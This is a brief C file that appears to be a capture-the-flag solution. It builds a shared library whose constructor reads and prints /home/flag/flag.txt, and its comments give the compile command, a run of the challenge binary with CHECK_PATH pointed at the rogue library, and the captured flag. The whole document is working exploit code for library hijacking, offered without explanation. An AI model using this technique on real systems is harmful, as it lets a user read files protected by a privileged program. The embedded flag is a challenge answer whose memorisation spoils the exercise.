#include <stdio.h>
#include <fcntl.h>

void __attribute__ ((constructor))  my_init(void)
{
    char        buf[32];

    int fd = open("/home/flag/flag.txt", O_RDONLY);
    int r = read(fd, buf, 32);
    buf[r] = '\0';
    puts(buf);
    return 0;
}

// gcc dowin.c -shared -fPIC -o dowin.so
// CHECK_PATH=`pwd` /home/flag/guessflag flag
// INS{th4t_library_was_usele$$}
